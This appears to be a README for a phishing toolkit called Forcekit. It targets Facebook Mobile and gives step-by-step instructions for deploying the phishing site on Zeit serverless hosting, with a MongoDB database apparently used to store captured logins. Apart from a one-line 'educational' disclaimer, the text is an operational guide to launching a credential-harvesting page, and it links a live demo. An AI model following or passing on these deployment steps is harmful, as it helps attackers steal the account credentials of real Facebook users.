# Forcekit Phishing Toolkit 🎣

This is only for educational perpose. 

It's using zeit serverless architecture with lambda functions.

Check the [demo](https://forcekit.forcekit.now.sh)

## Currenty supported platforms

* Facebook Mobile

## How to deploy on your own

1) Clone the project with `git clone git@github.com:forcekit/forcekit.git`
2) You need a mongodb database. You can use mongodb.com free tier cluster.
3) Type the command `cp .env.example .env` and change mongo db connection string with connection details.
4) Install `now` from zeit using `npm install -g now`
5) Run `now dev` to run development server locally. You can test now.
6) You need to add enviroment to production too. For that use `now secrets add mongo-uri "connection string". Replace the connection string with same connection string you used in `.env` 
7) Run `now` to deploy to production. You will get an url.
